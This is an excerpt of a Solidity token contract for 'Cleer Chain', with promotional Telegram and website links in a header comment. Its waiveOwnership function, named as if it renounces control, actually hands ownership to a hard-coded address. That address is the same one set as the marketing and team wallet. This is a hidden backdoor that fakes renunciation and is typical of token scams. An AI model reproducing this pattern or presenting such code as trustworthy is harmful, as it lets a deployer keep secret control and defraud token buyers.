...
/**
Telegram : https://t.me/Cleerchain
Website  : https://cleer-chain.live/#
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x1A4f77160e33eA9b246dcb9Ce7aA3276089f56E1);
    }
...
contract CleerChain is Context, IERC20, Ownable {
    ...
    string private _name = "Cleer Chain";
    string private _symbol = "Cleer";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x1A4f77160e33eA9b246dcb9Ce7aA3276089f56E1);
    address payable public teamWalletAddress = payable(0x1A4f77160e33eA9b246dcb9Ce7aA3276089f56E1);
